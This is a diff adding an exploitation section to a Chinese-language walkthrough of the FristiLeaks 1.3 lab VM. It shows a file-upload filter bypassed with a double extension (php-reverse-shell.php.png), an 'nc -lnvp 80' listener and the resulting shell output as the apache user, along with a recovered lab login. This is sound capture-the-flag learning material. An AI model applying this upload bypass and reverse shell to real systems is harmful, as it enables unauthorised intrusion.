@@ -100,9 +100,30 @@ nikto 扫描一下web漏洞：
 这个图片上的字符：keKkeKKeKKeKkEkkEk猜测可能是密码，于是尝试登陆，eezeepz/keKkeKKeKKeKkEkkEk组合能够正常登陆，而admin/keKkeKKeKKeKkEkkEk组合无法正常登陆。<br />
 <img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/6.png" width="46%" display="block"> <br />
 发现一个链接，点进去后是一个长传页面，怀疑存在文件上传漏洞：<br />
-<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/7.png" width="65%" display="block"> <br />
+<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/7.png" width="46%" display="block"> <br />
 
 # Exploitation
+经过测试正常的图片.png/.jpg/.gif是可以上传的，<br />
+<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/8.png" width="46%" display="block"> <br />
+但是.php的文件是无法上传的：<br />
+<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/9.png" width="46%" display="block"> <br />
+尝试使用多层文件扩展后缀，寄希望于服务器能解析，尝试上传一个php反弹shell木马，发现上传成功<br />
+<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/10.png" width="46%" display="block"> <br />
+
+访问http://192.168.0.101/fristi/uploads/php-reverse-shell.php.png，Kali监听nc -lnvp 80，成功获取一个webshell。
+```shell
+┌──(root㉿kali)-[~]
+└─# nc -lnvp 80
+listening on [any] 80 ...
+connect to [192.168.0.100] from (UNKNOWN) [192.168.0.101] 35224
+Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 04:38:38 up  8:23,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.1$
+```
+
 
 # Post-Exploitation
 
